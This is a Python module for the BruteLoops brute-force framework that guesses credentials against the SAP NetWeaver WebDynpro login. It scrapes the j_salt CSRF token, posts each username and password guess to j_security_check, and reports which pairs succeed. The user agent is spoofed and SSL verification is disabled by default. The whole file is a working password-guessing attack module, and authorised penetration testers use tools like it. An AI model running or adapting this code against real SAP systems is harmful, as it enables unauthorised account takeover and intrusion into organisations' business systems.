#!/usr/bin/env python3
import warnings
warnings.filterwarnings('ignore')
import re
import requests
import logging
from logging import getLogger, INFO
from BruteLoops.example.module import Module as BLModule

# Get the brute force logger
log = getLogger('BruteLoops.example.modules.http.sap_webdynpro')
getLogger('urllib3.connectionpool').setLevel(INFO)

UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (' \
    'KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36'

BASE_PATH = '/webdynpro/dispatcher/sap.com/tc~wd~tools'

class Module(BLModule):

    name = 'http.sap_webdynpro'
    description = brief_description = 'SAP Netweaver Webdynpro, ver. ' \
        '7.3007.20120613105137.0000'

    def __init__(self, url:'required:True,type:str,help:Base URL, e.g.' \
                'https://sap.somedomain.com. Standard paths will be suffixed',
            proxies:'required:False,type:str,help:HTTP proxies'=None,
            headers:'required:False,type:str,help:HTTP headers'=None,
            verify_ssl:'required:False,type:str,help:Verify SSL'=False):

        self.url = url+BASE_PATH
        self.proxies = proxies if proxies else {}
        self.headers = headers if headers else {}
        self.verify_ssl = verify_ssl if verify_ssl != None else False

    def __call__(self,username,password,*args,**kwargs):


        # Construct a session
        session = requests.Session()
        session.headers = {'User-Agent':UA}

        # ========================
        # GET COOKIES & CSRF TOKEN
        # ========================

        # Get cookies
        resp = session.get(self.url+'/WebDynproConsole',
                verify=self.verify_ssl,
                proxies=self.proxies)

        # Find the j_salt value from the response body
        match = re.search('name="j_salt" value="(.*?)"', resp.text)

        if not match:
            raise Exception('Failed to extract j_salt CSRF token')

        # =====================
        # GUESS THE CREDENTIALS
        # =====================
    
        # make the request
        resp = session.post(self.url+'/j_security_check',
                data={
                        'j_salt':match.groups()[0],
                        'j_username':username,
                        'j_password':password
                    },
                verify=self.verify_ssl,
                allow_redirects=False,
                proxies=self.proxies)

        if re.search('Logon with password not allowed', resp.text):
            log.log(60, f'Logon with password not allowed: {username}')
    
        # verify credentials and return outcome
        if resp.status_code == 200 and \
                re.search('authentication failed', resp.text, re.I):
            return [0, username, password]
        else:
            return [1, username, password]
